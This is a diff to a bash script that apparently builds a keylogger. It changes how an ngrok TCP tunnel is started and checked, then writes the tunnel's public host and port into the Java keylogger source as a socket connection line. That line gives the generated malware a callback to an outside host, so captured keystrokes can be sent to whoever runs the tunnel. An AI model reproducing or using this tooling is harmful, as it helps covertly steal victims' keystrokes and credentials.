@@ -174,6 +174,11 @@ function ngrok_start() {
     xterm -T " Starting Ngrok " -geometry 100x25-1+0 -e "ngrok tcp $port" & > /dev/null 2>&1
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Please wait..\n"
     sleep 10;
+    if [[ $(curl --silent http://127.0.0.1:4040/api/tunnels) == "" ]]; then
+      printf "\n\e[0mTCP tunnels are only available after you sign up.\nSign up at: https://ngrok.com/signup\n\nIf you have already signed up, make sure your authtoken is installed.\nYour authtoken is available on your dashboard: https://dashboard.ngrok.com/auth/your-authtoken\n\nERR_NGROK_302";
+      ctrl_c;
+    fi
+    
   elif [[ $code -eq 3 ]]; then
     pkill -f ngrok
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Starting Ngrok..\n"
@@ -244,17 +249,12 @@ elif [[ $code -eq 2 ]]; then
   elif [[ $host -eq 2 ]] || [[ $host -eq 02 ]]; then
     printf '\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m]\e[0m\e[1;77m Choose a Port (Default: \e[1;77m\e[38;5;154m%s\e[0m): \e[0m' $random_port;
     read port;port="${port:-${random_port}}"
-    if [[ ! -e ~/.ngrok2/ngrok.yml ]]; then
-       printf "\n\e[0m\e[38;5;9m%qPlease Add authtoken identifying a user.%q
-       \n\033[1;35mInstalling your Authtoken:\n\e[0m\e[1;77mhttps://ngrok.com/docs#getting-started-authtoken\e[0m\n"; exit 1;
-    else
-       ngrok_start
-       for serverngrok in `curl --silent http://127.0.0.1:4040/api/tunnels | grep -o "[0-9].tcp.ngrok.io"`; do
-         for serverport in `curl --silent http://127.0.0.1:4040/api/tunnels | sed -nE 's/command_line","*public_url":"([^"]*).*/*\1/p' | grep -o "[0-9]*$"`; do
-           printf "        Socket socket = new Socket(\"%s\", %s);\n" $serverngrok $serverport >> $keylogger_source
-         done
-       done
-    fi
+    ngrok_start
+    for serverngrok in `curl --silent http://127.0.0.1:4040/api/tunnels | grep -o "[0-9].tcp.ngrok.io"`; do
+      for serverport in `curl --silent http://127.0.0.1:4040/api/tunnels | sed -nE 's/command_line","*public_url":"([^"]*).*/*\1/p' | grep -o "[0-9]*$"`; do
+        printf "        Socket socket = new Socket(\"%s\", %s);\n" $serverngrok $serverport >> $keylogger_source
+      done
+    done
   else
     exit 1;
   fi
